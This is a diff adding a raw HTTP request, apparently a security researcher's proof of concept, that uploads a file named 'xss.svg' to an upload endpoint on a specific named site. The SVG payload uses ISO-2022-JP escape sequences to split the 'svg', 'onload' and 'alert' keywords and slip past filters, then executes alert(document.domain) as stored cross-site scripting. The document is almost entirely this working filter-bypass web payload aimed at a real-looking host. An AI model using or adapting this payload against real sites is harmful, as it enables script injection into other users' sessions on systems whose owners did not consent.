@@ -1,0 +1,22 @@
+# ISO-2022-JP字符集归一化
+POST /imagic/common/uploadTempFile HTTP/1.1
+Host: szdx.yhdx.hzyuhang.cn
+Content-Length: 412
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf2541b37) XWEB/20089 miniProgram/wxb5b36c05970039a3
+
+ Accept: application/json, text/plain, */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryd79CXLSpzE7hS9eJ Origin: https://szdx.yhdx.hzyuhang.cn
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://szdx.yhdx.hzyuhang.cn/low/r/h5/?rc=4001&id=1857995585718583296&orgId=1834069 748841709568&qrCodeId=1832240985799655424&isDing=false&name=&mobile=&unit=&lice nseNo=
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=1, i
+Connection: keep-alive
+------WebKitFormBoundaryd79CXLSpzE7hS9eJ Content-Disposition: form-data; name="orgId"
+123
+------WebKitFormBoundaryd79CXLSpzE7hS9eJ Content-Disposition: form-data; name="file"; filename="xss.svg" Content-Type: image/svg+xml
+<?xml version="1.0" encoding="ISO-2022-JP"?>
+<sv(Bg xmlns="http://www.w3.org/2000/svg" o(Bnlo(Bad="ale(Brt(document.domain)"/>
+------WebKitFormBoundaryd79CXLSpzE7hS9eJ--
